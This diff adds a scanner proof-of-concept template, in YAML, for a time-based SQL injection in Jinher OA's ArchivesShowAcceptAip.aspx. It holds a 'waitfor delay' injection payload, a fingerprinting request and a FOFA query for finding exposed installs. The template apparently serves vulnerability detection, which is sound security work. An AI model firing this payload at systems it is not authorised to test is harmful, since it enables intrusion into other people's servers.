@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-archivesshowacceptaip-aspx-sqli
+info:
+  name: 金和OA ArchivesShowAcceptAip SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(1,4)
+  t2: t1 * 4
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: contains(body,"JHSoft")
+- method: GET
+  path: /c6/Jhsoft.Web.Archives/ArchivesShowAcceptAip.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"收文信息") &&
+
+    contains(gbk_decode(body),"公文类型") &&
+
+    contains(gbk_decode(body),"秘密等级") &&
+
+    duration >= t2 &&
+
+    duration <= t3
+
+    '
+transport: http
